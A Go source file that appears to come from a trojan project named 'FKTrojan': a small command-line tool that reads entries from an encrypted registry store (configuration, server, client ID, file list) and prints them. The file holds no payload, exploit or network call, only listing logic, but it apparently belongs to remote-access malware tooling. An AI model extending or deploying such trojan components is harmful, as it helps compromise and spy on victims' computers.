package main

import (
	. "FKTrojan/client_tools/common"
	"FKTrojan/registry_crypto"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"sort"
)

func JsonPrintHelp() {

	app := AppUsage{
		Name:    ExeBaseName(),
		Version: "1.0.0",
		Desc:    "this is for show client info",
		Parameters: []Parameter{
			{
				LongFmt:  "-t",
				ShortFmt: "-t",
				Example:  "all",
				Desc:     "all : all info; conf : configure; list: file list; ID:client ID",
				Required: true,
				Type:     "string",
			},
		},
	}
	var b []byte
	if len(os.Args) >= 2 && os.Args[1] == "--HELP" {
		b, _ = json.Marshal(app)
	} else {
		b, _ = json.MarshalIndent(app, " ", " ")
	}
	fmt.Println(string(b))
}

func Print(l map[string]string, k string) {
	showKey := make([]string, 0)
	if k != "" && k != "list" {
		showKey = append(showKey, k)
	} else {
		for v := range l {
			if k == "list" {
				if v != "config" &&
					v != "server" &&
					v != "ID" {
					showKey = append(showKey, v)
				}
			} else {
				showKey = append(showKey, v)
			}
		}
		sort.Strings(showKey)
	}
	lens := len(showKey)
	for i, _ := range showKey {
		key := showKey[lens-i-1]
		fmt.Printf("%s:%s\n", key, l[key])
	}

}
func main() {
	if len(os.Args) > 1 {
		if os.Args[1] == "--help" || os.Args[1] == "-h" {
			JsonPrintHelp()
			os.Exit(0)
		}
	}
	t := flag.String("t", "", "")
	l, err := registry_crypto.List()
	flag.Parse()
	if err != nil {
		fmt.Printf("list error %v", err)
		os.Exit(1)
	}
	var k string
	switch *t {
	case "all":
		k = ""
		break
	default:
		k = *t
		break
	}
	Print(l, k)
}
